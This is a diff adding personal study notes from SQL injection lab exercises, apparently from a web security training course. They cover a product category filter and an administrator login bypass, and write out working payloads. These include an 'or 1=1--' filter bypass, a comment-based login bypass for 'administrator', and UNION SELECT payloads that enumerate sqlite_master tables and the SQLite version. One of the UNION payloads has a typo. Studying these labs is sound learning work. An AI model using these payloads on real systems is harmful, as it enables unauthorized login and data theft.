@@ -1,0 +1,41 @@
+
+------------lab1# SQL injection - product category filter-------------
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+end goal: display all products both released and unreleased
+
+Analysis:
+category>Accessories
+SELECT * FROM products WHERE category = 'Accessories' AND released = 1
+SELECT * FROM products WHERE category = ''' AND released = 1
+SELECT * FROM products WHERE category = ''--' AND released = 1  
+    SELECT * FROM products WHERE category = ''  that is what happens in the database behind
+
+SELECT * FROM products WHERE category = ''or 1=1--' AND released = 1  to display all the products
+
+------------lab2 allowing login bypass -------------
+
+end goal: perform SQLi attack and log in as administrator user.
+Analysis:
+SELECT firstname FROM users WHERE username = 'admin' AND password = 'admin'
+SELECT firstname FROM users WHERE username = '' ' AND password = 'admin' (internal server error)
+SELECT firstname FROM users WHERE username = 'admin'--' AND password = 'admin' (-- ignores anything after meaning password ignored)
+SELECT firstname FROM users WHERE username = 'admin' (admin is not a user in the system)
+
+SELECT firstname FROM users WHERE username = 'administrator'--' AND password = 'admin' 
+script.py <url> <sql-payloads>
+
+
+
+
+
+
+
+
+
+
+')) UNION select name,name,name,name,name,name,name,name,name, from sqlite_masrter where type='table' --
+')) UNION select sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(); --
+')) UNION select 'name',NULL --
+')) UNION select 'name',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL; --
